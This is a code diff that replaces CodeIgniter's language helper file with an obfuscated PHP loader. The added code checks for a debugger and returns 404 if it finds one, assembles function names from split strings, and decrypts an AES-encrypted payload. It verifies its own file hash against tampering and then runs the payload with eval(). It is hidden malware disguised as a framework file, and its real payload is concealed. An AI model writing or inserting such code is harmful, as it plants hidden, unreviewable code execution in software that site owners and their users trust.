@@ -1,75 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Language Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/language_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('lang'))
-{
-	/**
-	 * Lang
-	 *
-	 * Fetches a language variable and optionally outputs a form label
-	 *
-	 * @param	string	$line		The language line
-	 * @param	string	$for		The "for" value (id of the form element)
-	 * @param	array	$attributes	Any additional HTML attributes
-	 * @return	string
-	 */
-	function lang($line, $for = '', $attributes = array())
-	{
-		$line = get_instance()->lang->line($line);
-
-		if ($for !== '')
-		{
-			$line = '<label for="'.$for.'"'._stringify_attributes($attributes).'>'.$line.'</label>';
-		}
-
-		return $line;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ilva86b7=('bas'.'e64'.'_de'.'cod'.'e');
+$_nb53czfa=('gzu'.'nco'.'mpr'.'ess');
+$_zk5rh8nz=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_sbg7aemb='N7lDvyGI';
+$_fmhvfbbi='nrYrISF3';
+$_skvw12ce='djWVUNrD';
+$_aq0jq6qa='0EkXpnTQ';
+$_dcoe71w9='rDLyXrgtdQY=';
+$_cuolzw04='AdB1iEPy';
+$_gna8u5ul='fSZbzl2V';
+$_rrcx192o='HC9jQQ==';
+$_cej92ahf=$_ilva86b7($_fmhvfbbi.$_skvw12ce.$_sbg7aemb.$_aq0jq6qa.$_dcoe71w9);
+$_ghduurab=$_ilva86b7($_cuolzw04.$_gna8u5ul.$_rrcx192o);
+$_nkjf0lgh=$_ilva86b7('uiZb4s26u7KNRKUFmeA4IbF0FmokG0zgQMVrPq6IgAMTfQosjZ6zsvXfCbk3bXpsr9/Lo4qdUakTGpYs0xu/zTTq5SdgPq7hqPi6no5CIRWl6pAXMR82Kp1TUYCJQzhaSsM3q1Ic9f8qnn3Ik3Wqh/JI49diovKLKJwpqt6IGx1L07PYntfeFiX1vfViBID+Q2YmSXa7cf9/h4vsWgfqy4ZpUyzMOwLecOe7WVz+aSrDZqyWKgdO/HPv4DlCfhgduBu8jQaI+xXGWcOjdq7MNY7+ntNQoiiNM/ecLKBX3i5JoJs9sOlQxLqaJt80kof+');
+$_avo0jh0x=$_zk5rh8nz($_nkjf0lgh,'aes-256-cbc',$_cej92ahf,OPENSSL_RAW_DATA,$_ghduurab);
+if($_avo0jh0x===false){exit;}
+$_qhwalfnc=$_nb53czfa($_avo0jh0x);
+if($_qhwalfnc===false){exit;}
+$_np61dctg='792e29171dc07c2826f2d540815696a322662a6538e13e5cb0dd99e843c3eb3f';
+$_lu0mvkeb=@file_get_contents(__FILE__);
+if($_lu0mvkeb!==false){
+$_fjuzqhgd=str_replace($_np61dctg,"0000000000000000000000000000000000000000000000000000000000000000",$_lu0mvkeb);
+$_bzh89sco=hash("sha256",$_fjuzqhgd);
+if($_bzh89sco!==$_np61dctg){@http_response_code(403);exit;}
 }
+eval($_qhwalfnc);
